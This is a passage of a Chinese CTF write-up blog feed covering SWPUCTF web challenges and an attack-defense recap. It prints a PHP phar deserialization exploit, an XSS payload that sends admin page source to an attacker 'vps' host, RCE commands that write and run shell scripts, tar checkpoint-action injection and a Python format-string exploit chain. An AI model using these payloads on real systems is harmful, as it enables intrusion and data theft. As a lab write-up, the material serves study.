class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">public $test;</span><br><span class="line">public $str;</span><br><span class="line">public function __construct($name)</span><br><span class="line">&#123;</span><br><span class="line"> $this‐&gt;str = $name;</span><br><span class="line">&#125;</span><br><span class="line">public function __destruct()</span><br><span class="line">&#123;</span><br><span class="line"> $this‐&gt;test = $this‐&gt;str;</span><br><span class="line"> echo $this‐&gt;test;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">public $source;</span><br><span class="line">public $str;</span><br><span class="line">public function __construct($file)</span><br><span class="line">&#123;</span><br><span class="line"> $this‐&gt;source = $file;</span><br><span class="line"> echo $this‐&gt;source;</span><br><span class="line">&#125;</span><br><span class="line">public function __toString()</span><br><span class="line">&#123;</span><br><span class="line"> $content = $this‐&gt;str[&apos;str&apos;]‐&gt;source;</span><br><span class="line"> return $content;</span><br><span class="line">&#125;</span><br><span class="line">public function __set($key,$value)</span><br><span class="line">&#123;</span><br><span class="line"> $this‐&gt;$key = $value;</span><br><span class="line">&#125;</span><br><span class="line">public function _show()</span><br><span class="line">&#123;</span><br><span class="line"> if(preg_match(&apos;/http|https|file:|gopher|dict|\.\.|f1ag/i&apos;,$this‐&gt;source)) &#123;</span><br><span class="line"> die(&apos;hacker!&apos;);</span><br><span class="line"> &#125; else &#123;</span><br><span class="line"> highlight_file($this‐&gt;source);</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">public function __wakeup()</span><br><span class="line">&#123;</span><br><span class="line"> if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this‐&gt;source)) &#123;</span><br><span class="line"> echo &quot;hacker~&quot;;</span><br><span class="line"> $this‐&gt;source = &quot;index.php&quot;;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">public $file;</span><br><span class="line">public $params;</span><br><span class="line">public function __construct()</span><br><span class="line">&#123;</span><br><span class="line"> $this‐&gt;params = array();</span><br><span class="line">&#125;</span><br><span class="line">public function __get($key)</span><br><span class="line">&#123;</span><br><span class="line"> return $this‐&gt;get($key);</span><br><span class="line">&#125;</span><br><span class="line">public function get($key)</span><br><span class="line">&#123;</span><br><span class="line"> if(isset($this‐&gt;params[$key])) &#123;</span><br><span class="line"> $value = $this‐&gt;params[$key];</span><br><span class="line"> &#125; else &#123;</span><br><span class="line"> $value = &quot;index.php&quot;;</span><br><span class="line"> &#125;</span><br><span class="line"> return $this‐&gt;file_get($value);</span><br><span class="line">&#125;</span><br><span class="line">public function file_get($value)</span><br><span class="line">&#123;</span><br><span class="line"> $text = base64_encode(file_get_contents($value));</span><br><span class="line"> return $text;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>照base.php的提示,flag就在 f1ag.php 中,那么可以通过读取f1ag.php文件来获取flag,只有highlight_file() 和 file_get_contents()函数可以获取文件内容但是上传文件处做了白名单,无法上传php_show 方法把f1agWAF掉，无法显示f1ag.php所以最后只有从 file_get_contents() 函数下手</p><p>但是没有 serialize() 和 unserialize() 函数所以就没有办法直接触<br>发 file_get_contents() 所在的 Test 类，结合文件上传的功能点，我们不难想到用上传phar包来触发反序列化</p><p>phar触发反序列化漏洞有一下要求:</p><ol><li>存在文件操作函数,例如 file_exits() 、 file_get_contents() 等等，且其中的参数可控</li><li>在类中存在 __destruct 方法</li><li>可上传phar构造文件</li></ol><p>推荐链接<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用phar拓展php反序列化攻击面</a></p><p>file.php中存在 file_exits() ,且 $file 可控<br>class.php中存在 __destruct() 方法<br>function.php存在文件上传</p><p><strong>get 方法是在访问一个类不存在或者是不可访问的变量时会触发。要想办法触发 </strong>get</p><p>Show 类的 <strong>toString 魔术方法中<br>public function </strong>toString()<br>{<br> $content = $this‐&gt;str[‘str’]‐&gt;source;<br> return $content;<br>}<br>存在 $this‐&gt;str[‘str’]‐&gt;source ,如果 $this‐&gt;str[‘str’] 为 Test 类的话，那么就会访问不存在的 source 变量，当一个对象被当做<br>字符串时调用会触发__toString 方法</p><p>反序列化的时候不会执行构造函数即construct，所以置空参数，让test类的get方法返回文件内容，再通过c1e4r类的echo输出到页面上<br>所以构造poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class C1e4r</span><br><span class="line">&#123;</span><br><span class="line">    public $test;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str = $name;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;test = $this-&gt;str;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo $this-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $content = $this-&gt;str[&apos;str&apos;]-&gt;source;</span><br><span class="line">        return $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __set($key,$value)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&apos;/http|https|file:|gopher|dict|\.\.|f1ag/i&apos;,$this-&gt;source)) &#123;</span><br><span class="line">            die(&apos;hacker!&apos;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/http|https|file:|gopher|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker~&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line">    public $params;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;params = array();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($key);</span><br><span class="line">    &#125;</span><br><span class="line">    public function get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        if(isset($this-&gt;params[$key])) &#123;</span><br><span class="line">            $value = $this-&gt;params[$key];</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $value = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        return $this-&gt;file_get($value);</span><br><span class="line">    &#125;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag = new Test();</span><br><span class="line">$flag-&gt;params[&quot;source&quot;] = &quot;f1ag.php&quot;;</span><br><span class="line">$cls = new Show();</span><br><span class="line">$cls-&gt;str[&apos;str&apos;] = $flag;</span><br><span class="line">echo serialize(new C1e4r($cls));</span><br><span class="line"></span><br><span class="line">@unlink(&quot;bak6ry.phar&quot;);</span><br><span class="line">$test = new not_useful();</span><br><span class="line">$phar = new Phar(&quot;bak6ry.phar&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); // 增加gif文件头</span><br><span class="line">$phar-&gt;setMetadata($test);</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);</span><br><span class="line"></span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure></p><p>执行后会生成一个交bak6ry.phar的文件，将他上传<br>上传后保存的文件名是<br>$filename = md5($_FILES[“file”][“name”].$_SERVER[“REMOTE_ADDR”]).”.jpg”;</p><p>上传成功后,访问:file.php?file=phar://upload/文件名,base64解码后获得flag</p><p>提醒phar序列化的时候， 不会把类的方法反序列化，所以只能控类的成员。</p><h3 id="有趣的邮箱注册"><a href="#有趣的邮箱注册" class="headerlink" title="有趣的邮箱注册"></a>有趣的邮箱注册</h3><p>两个功能点<br>1.管理员页面<br><a href="http://118.89.56.208:6324/admin/admin.php" target="_blank" rel="noopener">http://118.89.56.208:6324/admin/admin.php</a><br>2.邮箱申请<br><a href="http://118.89.56.208:6324/check.php" target="_blank" rel="noopener">http://118.89.56.208:6324/check.php</a><br>然后发现访问管理员页面：only localhost allowed!<br>最开始以为可以通过Ip伪造，结果试了很多种方式伪造ip都未生效<br>邮箱处有个函数filter_var()匹配email的该函数有个漏洞<a href="https://xz.aliyun.com/t/2501单引号双引号重叠，用\可以绕过空格" target="_blank" rel="noopener">https://xz.aliyun.com/t/2501单引号双引号重叠，用\可以绕过空格</a></p><p>“&lt;script /src=//xss平台&gt;“@qq.com类似的方法，就可以绕过过滤，然后构造xss的payload如下<br>“&lt;script /src=//xss平台&gt;“@qq.com</p><p><img src="4.jpg" alt=""><br>因为打不到管理员的cookie，就打admin.php的页面源码了<br><img src="5.jpg" alt=""><br>也可以用ajax去做<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xmlhttp=new XMLHttpRequest();</span><br><span class="line">xmlhttp.onreadystatechange=function()</span><br><span class="line">&#123;</span><br><span class="line">    if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200)</span><br><span class="line">    &#123;</span><br><span class="line">        document.location=&apos;http://vps:1234/?&apos;+btoa(xmlhttp.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">xmlhttp.open(&quot;GET&quot;,&quot;admin.php&quot;,true);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure></p><p>然后在服务器上nc监听</p><p> 发现后台会跳到：/admin/a0a.php?cmd=whoami<br>明显RCE，直接请求到这个url，发现出题人设置了本地，且匹配IP用的是 remote_addr，也就是说无法伪装IP</p><p>进行反弹shell，这样比较利于后续操作，于是改写脚本为<br>xmlhttp.open(“GET”,’<a href="http://localhost:6324/admin/a0a.php?cmd=echo%20&quot;xxxxxxxxxxxxx&quot;%20|%20base64%20-d%20&gt;%20/tmp/bak6ry.sh&#39;,true)" target="_blank" rel="noopener">http://localhost:6324/admin/a0a.php?cmd=echo%20&quot;xxxxxxxxxxxxx&quot;%20|%20base64%20-d%20&gt;%20/tmp/bak6ry.sh&#39;,true)</a>;<br>向/tmp写入一个bak6ry.sh<br>然后<br>xmlhttp.open(“GET”,’<a href="http://localhost:6324/admin/a0a.php?cmd=/bin/bash%20/tmp/bak6ry.sh&#39;,true)" target="_blank" rel="noopener">http://localhost:6324/admin/a0a.php?cmd=/bin/bash%20/tmp/bak6ry.sh&#39;,true)</a>;</p><p><img src="/swpu/6.png" alt=""><br>在/var/www/下发下<br><img src="/swpu/7.png" alt=""></p><p>发现有个关键的目录</p><p><img src="/swpu/8.png" alt=""><br>于是访问<br><img src="/swpu/9.png" alt=""><br>然后查看代码<br>backup.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include(&quot;upload.php&quot;);</span><br><span class="line">echo &quot;上传目录：&quot; . $upload_dir . &quot;&lt;br /&gt;&quot;;</span><br><span class="line">$sys = &quot;tar -czf z.tar.gz *&quot;;</span><br><span class="line">chdir($upload_dir);</span><br><span class="line">system($sys);</span><br><span class="line">if(file_exists(&apos;z.tar.gz&apos;))&#123;</span><br><span class="line">    echo &quot;上传目录下的所有文件备份成功!&lt;br /&gt;&quot;;</span><br><span class="line">    echo &quot;备份文件名: z.tar.gz&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;未上传文件，无法备份！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>发现经过tar *处理，于是上传文件</p><p>推荐文章<a href="https://blog.csdn.net/qq_27446553/article/details/80943097" target="_blank" rel="noopener">推荐文章</a></p><p>–checkpoint=1<br>–checkpoint‐action=exec=sh exp.sh<br>exp.sh<br>题目是用flag用户进行备份，通过tar让flag用户帮我们执行exp.sh<br>exp.sh的内容为<br>sky.sh的内容为</p><p>cat /flag | base64<br>最终结果<br><img src="/swpu/10.png" alt=""></p><p>得到flag:swpuctf{xss_!_tar_exec_instr3st1ng}</p><h3 id="皇家线上赌场"><a href="#皇家线上赌场" class="headerlink" title="皇家线上赌场"></a>皇家线上赌场</h3><p>os.path.join()函数用于路径拼接文件路径。<br>os.path.join()函数中可以传入多个路径：</p><pre><code>会从第一个以”/”开头的参数开始拼接，之前的参数全部丢弃。以上一种情况为先。在上一种情况确保情况下，若出现”./”开头的参数，会从”./”开头的参数的上一个参数开始拼接。</code></pre><p>首先确定：<br>1.存在文件包含<br>2.有泄露</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost]# tree web</span><br><span class="line">web/</span><br><span class="line">├── app</span><br><span class="line">│   ├── forms.py</span><br><span class="line">│   ├── __init__.py</span><br><span class="line">│   ├── models.py</span><br><span class="line">│   ├── static</span><br><span class="line">│   ├── templates</span><br><span class="line">│   ├── utils.py</span><br><span class="line">│   └── views.py</span><br><span class="line">├── req.txt</span><br><span class="line">├── run.py</span><br><span class="line">├── server.log</span><br><span class="line">├── start.sh</span><br><span class="line">└── uwsgi.ini</span><br><span class="line">[root@localhost]# cat views.py.bak</span><br><span class="line">filename = request.args.get(&apos;file&apos;, &apos;test.js&apos;)</span><br><span class="line">if filename.find(&apos;..&apos;) != -1:</span><br><span class="line">    return abort(403)</span><br><span class="line">if filename != &apos;/home/ctf/web/app/static/test.js&apos; and filename.find(&apos;/home/ctf/web/app&apos;) != -1:</span><br><span class="line">            return abort(404)</span><br><span class="line">filename = os.path.join(&apos;app/static&apos;, filename)</span><br></pre></td></tr></table></figure><p>从目录结构推测出是flask，<br>/static?file= 的路由,应该从这里来读取文件<br>如下代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">filename = request.args.get(&apos;file&apos;, &apos;test.js&apos;)</span><br><span class="line">if filename.find(&apos;..&apos;) != ‐1:</span><br><span class="line"> return abort(403)</span><br><span class="line">filename = os.path.join(&apos;app/static&apos;, filename)</span><br></pre></td></tr></table></figure></p><p>:</p><p>if filename != ‘/home/ctf/web/app/static/test.js’ and filename.find(‘/home/ctf/web/app’) != ‐1:<br> return abort(404)</p><p>这里利用到 os.path.join 函数的一个特性，<br>参数中的绝对路径参数前面的所有参数会被忽略<br>这里用到了 /proc/self/cwd 目<br>录，这个目录指向了当前进程的工作路径，而我在前面给了一个 os.path.join(‘app/static’,<br>filename) ，可知当前路径就是源码所在目录，因此构造访问 /static?<br>file=/proc/self/cwd/app/views.py ，成功读到文件：</p><p>尝试读取源码 /home/ctf/web_assli3fasdf/app/views.py ，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask_sqlalchemy import SQLAlchemy</span><br><span class="line">from .views import register_views</span><br><span class="line">from .models import db</span><br><span class="line"></span><br><span class="line">def create_app():</span><br><span class="line">    app = Flask(__name__, static_folder=&apos;&apos;)</span><br><span class="line">    app.secret_key = &apos;9f516783b42730b7888008dd5c15fe66&apos;</span><br><span class="line">    app.config[&apos;SQLALCHEMY_DATABASE_URI&apos;] = &apos;sqlite:////tmp/test.db&apos;</span><br><span class="line">    register_views(app)</span><br><span class="line">    db.init_app(app)</span><br><span class="line">    return app</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">def register_views(app):</span><br><span class="line">    @app.before_request</span><br><span class="line">    def reset_account():</span><br><span class="line">        if request.path == &apos;/signup&apos; or request.path == &apos;/login&apos;:</span><br><span class="line">            return</span><br><span class="line">        uname = username=session.get(&apos;username&apos;)</span><br><span class="line">        u = User.query.filter_by(username=uname).first()</span><br><span class="line">        if u:</span><br><span class="line">            g.u = u</span><br><span class="line">            g.flag = &apos;swpuctf&#123;xxxxxxxxxxxxxx&#125;&apos;</span><br><span class="line">            if uname == &apos;admin&apos;:</span><br><span class="line">                return</span><br><span class="line">            now = int(time())</span><br><span class="line">            if (now - u.ts &gt;= 600):</span><br><span class="line">                u.balance = 10000</span><br><span class="line">                u.count = 0</span><br><span class="line">                u.ts = now</span><br><span class="line">                u.save()</span><br><span class="line">                session[&apos;balance&apos;] = 10000</span><br><span class="line">                session[&apos;count&apos;] = 0</span><br><span class="line"></span><br><span class="line">    @app.route(&apos;/getflag&apos;, methods=(&apos;POST&apos;,))</span><br><span class="line">    @login_required</span><br><span class="line">    def getflag():</span><br><span class="line">        u = getattr(g, &apos;u&apos;)</span><br><span class="line">        if not u or u.balance &lt; 1000000:</span><br><span class="line">            return &apos;&#123;&quot;s&quot;: -1, &quot;msg&quot;: &quot;error&quot;&#125;&apos;</span><br><span class="line">        field = request.form.get(&apos;field&apos;, &apos;username&apos;)</span><br><span class="line">        mhash = hashlib.sha256((&apos;swpu++&#123;0.&apos; + field + &apos;&#125;&apos;).encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">        jdata = &apos;&#123;&#123;&quot;&#123;0&#125;&quot;:&apos; + &apos;&quot;&#123;1.&apos; + field + &apos;&#125;&quot;, &quot;hash&quot;: &quot;&#123;2&#125;&quot;&#125;&#125;&apos;</span><br><span class="line">        return jdata.format(field, g.u, mhas</span><br><span class="line"></span><br><span class="line">h)</span><br></pre></td></tr></table></figure><p>session伪造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/getflag&apos;, methods=(&apos;POST&apos;,))</span><br><span class="line">@login_required</span><br><span class="line">def getflag():</span><br><span class="line">    u = getattr(g, &apos;u&apos;)</span><br><span class="line">    if not u or u.balance &lt; 1000000:</span><br><span class="line">        return &apos;&#123;&quot;s&quot;: -1, &quot;msg&quot;: &quot;error&quot;&#125;&apos;</span><br><span class="line">    field = request.form.get(&apos;field&apos;, &apos;username&apos;)</span><br><span class="line">    mhash = hashlib.sha256((&apos;swpu++&#123;0.&apos; + field + &apos;&#125;&apos;).encode(&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">    jdata = &apos;&#123;&#123;&quot;&#123;0&#125;&quot;:&apos; + &apos;&quot;&#123;1.&apos; + field + &apos;&#125;&quot;, &quot;hash&quot;: &quot;&#123;2&#125;&quot;&#125;&#125;&apos;</span><br><span class="line">    return jdata.format(field, g.u, mhash)</span><br></pre></td></tr></table></figure><p>提示python3.5以及format，不难想到是格式化字符串的漏洞</p><p>推荐链接<a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">Python 格式化字符串漏洞</a></p><p>结合__init_.py，我们应该先跳到db，再跳到app</p><p>exp:<br>field=<strong>class</strong>.save.<strong>globals</strong>[db].<strong>class</strong>.<strong>init</strong>.<strong>globals</strong>[current_app].before_request.<strong>globals</strong></p><p>西南石油师傅举办的公益性比赛，web题的质量真心不错<br>接下来是线下赛的总结</p><h1 id="线下赛总结"><a href="#线下赛总结" class="headerlink" title="线下赛总结"></a>线下赛总结</h1><p>这次线下赛web分为三个环境三个端口四个漏洞</p><ol><li><p>typecho反序列化漏洞</p></li><li><p>tp最新爆出的一个漏洞<br><a href="https://www.cn-space.com/2018/12/12/1/" target="_blank" rel="noopener">ThinkPHP5多个RCE+文件写入漏洞 </a></p></li><li><p>易优cms<a href="https://xz.aliyun.com/t/2632" target="_blank" rel="noopener">前台getshell</a></p></li><li>phpmyadmin<a href="https://blog.csdn.net/qq_42154484/article/details/80773895" target="_blank" rel="noopener">cve-2018-12613-PhpMyadmin后台文件包含</a></li></ol><p>一来被一个队伍改了数据库的弱口令，原因是找网页配置文件时，web1的文件实在太多，找到半天还不是root数据库用户的密码，结果在web2的配置文件里有，因为密码被改导致服务坏掉，所以速度要快</p><ol><li>备份很重要</li></ol><p><code>tar -zcvf /tmp/web.tar.gz /var/www/html</code><br>将网页打包放到tmp下命名为web.tar.gz</p><p>3.将所有弱口令密码都修改了，然后再备份一次源码</p><ol start="2"><li><p>接着就是上通防御waf，如果不行的话，就把通防waf放漏洞页面，这里犯了一个错，www-data是没有tmp下文件的读写权限的，二我们预先写好的脚本是把包含的waf文件放在tmp下的，生成日志也是放在tmp下，所以一开始看的攻击的流量漫天飞，自己都无法定位攻击者，所以一来防御好很重要，防御的同时可以派一个人乘别人还没把洞补上去多拿点分，然后将次源码备份下来攻击时立马恢复，恢复命令：<code>tar -zxvf /tmp/web.tar.gz</code></p></li><li><p>文件监控很重要，你可以知道哪个地方被写马了，如果没有文件监控可以执行<code>find /var/www/html -name &#39;*.php&#39; -mmin -30 | xargs grep &#39;$_POST&#39;</code>查找30分钟内被修改的包含特定关键字的文件通过别人写木马的地址和参数，可以试试别人是否也被批量上马了，这次我就通过次直接连了被人的webshell</p></li><li>被攻击的时候一定不要慌，通过审日志通过别人的攻击流量反打回去是个不错的方式，但是对方可以对你进行大量的流量干扰</li><li>可以将别人的首页复制粘贴下来放到自己首页上，这样攻击者访问首页的超链接的时候会自动跳转到复制来的网页对应的功能点去，可以减少自己被攻击的频率，当然有可能会被主办方check</li><li>写一个批量化自动提交flag的脚本在中后期非常关键,可以提前写好一个攻击框架<br>7.比赛前会有一个网络配置环节。这个可以提前练习一下，速度一定要快，抢先备份最原始无马的源码</li><li>可以控制web目录下的权限都为555</li><li>给自己上一个密码比较复杂的运维马，目的是拥有www-data的权限，好对网页进行修改，清楚不死马等操作</li></ol><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>最后这次比赛已经办了九届了，很多题的质量确实还是不错的，无论是线上还是线下赛都学习到不少的东西</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;第九届swpuctf杂项题，web题加线下赛攻防总结&lt;/p&gt;
&lt;h1 id=&quot;线上赛&quot;&gt;&lt;a href=&quot;#线上赛&quot; class=&quot;headerlink&quot; title=&quot;线上赛&quot;&gt;&lt;/a&gt;线上赛&lt;/h1&gt;&lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class
      
    
    </summary>
    
      <category term="比赛" scheme="http://yoursite.com/categories/%E6%AF%94%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>swpuawd赛前准备</title>
    <link href="http://yoursite.com/2019/01/01/swpuawd/"/>
    <id>http://yoursite.com/2019/01/01/swpuawd/</id>
    <published>2019-01-01T01:25:00.000Z</published>
    <updated>2020-04-07T15:49:12.756Z</updated>
    
